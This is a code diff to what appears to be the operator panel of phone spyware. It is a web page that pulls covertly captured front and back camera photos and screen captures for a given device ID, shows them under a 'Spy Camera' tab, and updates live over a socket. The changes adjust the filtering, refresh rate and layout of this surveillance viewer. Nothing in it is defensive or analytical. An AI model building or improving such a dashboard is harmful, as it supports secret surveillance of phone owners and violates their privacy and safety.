@@ -8,7 +8,7 @@
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 
     <style>
-        /* --- DARK THEME --- */
+        /* --- DARK THEME & STYLING --- */
         :root {
             --bg-color: #0f0f0f;
             --glass-bg: rgba(255, 255, 255, 0.05);
@@ -74,10 +74,10 @@
             justify-content: center;
         }
         
-        .img-card img {
+        .img-card img { 
             width: 100%; 
             height: 100%; 
-            object-fit: contain; 
+            object-fit: cover; 
             background-color: #000;
             transition: transform 0.3s;
         }
@@ -108,13 +108,13 @@
             padding: 10px; box-sizing: border-box;
         }
         .modal img { 
-            max-width: 100%; max-height: 85vh; 
+            max-width: 100%; max-height: 80vh; 
             border-radius: 5px; box-shadow: 0 0 20px #000; 
             object-fit: contain; 
         }
         .modal-close { position: absolute; top: 15px; right: 20px; color: #fff; font-size: 2.5rem; cursor: pointer; z-index: 1001; }
         
-        .modal-actions { margin-top: 15px; display: flex; gap: 20px; }
+        .modal-actions { margin-top: 20px; display: flex; gap: 20px; }
         .action-btn {
             background: #333; color: #fff; padding: 10px 25px;
             border-radius: 30px; text-decoration: none; font-size: 0.9rem;
@@ -169,8 +169,8 @@
         <span class="modal-close" onclick="closeModal()">&times;</span>
         <img id="fullImage" src="">
         <div class="modal-actions">
-            <a id="downloadLink" href="#" download class="action-btn btn-download">
-                <i class="fa-solid fa-download"></i> Save
+            <a id="downloadLink" href="#" target="_blank" class="action-btn btn-download">
+                <i class="fa-solid fa-download"></i> Open/Save
             </a>
             <button onclick="closeModal()" class="action-btn">Close</button>
         </div>
@@ -206,19 +206,18 @@
                 alert("Device ID Missing!");
                 return;
             }
-            fetchFiles(true, false); // First load
-            setupSocket();           // Live connection
+            fetchFiles(true, false); 
+            setupSocket();           
 
-            // Auto Refresh
+            // Auto Refresh every 5 seconds
             setInterval(() => {
                 fetchFiles(true, true);
-            }, 2000); 
+            }, 5000); 
         };
 
         // ==========================================
-        //  2. FETCH DATA & SORTING
+        //  2. FETCH DATA FROM SERVER
         // ==========================================
-        
         function fetchFiles(isReset = false, isBackground = false) {
             if (isLoading && !isBackground) return; 
             
@@ -246,6 +245,7 @@
                         loadMoreArea.style.display = 'none';
                     }
 
+                    // Check if new data is actually different before updating array
                     const isDataDifferent = JSON.stringify(newFiles) !== JSON.stringify(allFilesData.slice(0, newFiles.length));
 
                     if (isReset) {
@@ -255,7 +255,6 @@
                         allFilesData = [...allFilesData, ...newFiles]; 
                     }
 
-                    sortFilesByTime();
                     renderGallery();
                 })
                 .catch(err => {
@@ -267,24 +266,6 @@
 
         function fetchNextPage() {
             if (nextCursor) fetchFiles(false, false);
-        }
-
-        function sortFilesByTime() {
-            allFilesData.sort((a, b) => {
-                const timeA = extractTime(a);
-                const timeB = extractTime(b);
-                return timeB - timeA; 
-            });
-        }
-
-        function extractTime(url) {
-            try {
-                const filename = url.split('/').pop(); 
-                const timePart = filename.split('.')[0]; 
-                return Number(timePart) || 0;
-            } catch (e) {
-                return 0;
-            }
         }
 
         // ==========================================
@@ -305,15 +286,22 @@
             const filtered = allFilesData.filter(url => {
                 const lowerUrl = url.toLowerCase();
                 
-                // Exclude any 'gallery' path files first (Since Gallery page is separate)
-                if (lowerUrl.includes('gallery')) return false;
+                // 🛑 1. IGNORE GALLERY FOLDERS
+                // Ye sabse important hai: agar path mein 'gallery' hai, toh ise list se hata do.
+                if (lowerUrl.includes('/gallery/')) return false;
+
+                // 🔍 2. IDENTIFY CAMERA
+                const isCamera = lowerUrl.includes('front') || 
+                                 lowerUrl.includes('back') || 
+                                 lowerUrl.includes('cam');
 
                 if (currentFilter === 'camera') {
-                    // TAB 1: Spy Camera
-                    return lowerUrl.includes('front') || lowerUrl.includes('back') || lowerUrl.includes('cam');
+                    // TAB 1: Only Spy Camera (Front/Back)
+                    return isCamera;
                 } else {
-                    // TAB 2: Screen Capture Only (No Gallery)
-                    return lowerUrl.includes('screen') || lowerUrl.includes('shot') || lowerUrl.includes('capture');
+                    // TAB 2: Screen Only
+                    // LOGIC: Agar ye Camera nahi hai (aur Gallery bhi nahi hai), toh ye Screen hi hoga.
+                    return !isCamera; 
                 }
             });
 
@@ -334,7 +322,7 @@
                 let badgeText = "Image";
                 if(url.includes('front')) badgeText = "Front Cam";
                 else if(url.includes('back')) badgeText = "Back Cam";
-                else if(url.includes('screen') || url.includes('shot')) badgeText = "Screen";
+                else badgeText = "Screen Capture"; // Default for non-cam images
 
                 div.innerHTML = `
                     <img src="${url}" loading="lazy" onerror="this.style.display='none'">
@@ -345,26 +333,32 @@
         }
 
         // ==========================================
-        //  4. REAL-TIME UPDATES
+        //  4. REAL-TIME SOCKET
         // ==========================================
         function setupSocket() {
             socket.on('new-file', (data) => {
                 console.log("New file via Socket:", data);
                 if (data.device_id === DEVICE_ID) {
                     
+                    // Add new file to top of list
                     if (!allFilesData.includes(data.url)) {
                         allFilesData.unshift(data.url);
-                        sortFilesByTime();
                     }
                     
-                    // Don't update if it's a gallery file
-                    if(data.url.includes('gallery') || data.type === 'gallery') return;
+                    // Live Filtering
+                    let urlLower = data.url.toLowerCase();
+                    
+                    // 1. Gallery Ignore
+                    if(urlLower.includes('/gallery/')) return; 
 
-                    let isCam = data.url.includes('cam') || data.url.includes('front') || data.url.includes('back');
-                    let isScreen = data.url.includes('screen') || data.url.includes('shot');
-
-                    if ((currentFilter === 'camera' && isCam) || (currentFilter === 'screen' && isScreen)) {
-                        renderGallery(); 
+                    // 2. Check Type
+                    let isCam = urlLower.includes('cam') || urlLower.includes('front') || urlLower.includes('back');
+                    
+                    // 3. Render if matches current tab
+                    if (currentFilter === 'camera' && isCam) {
+                        renderGallery();
+                    } else if (currentFilter === 'screen' && !isCam) {
+                        renderGallery();
                     }
                 }
             });
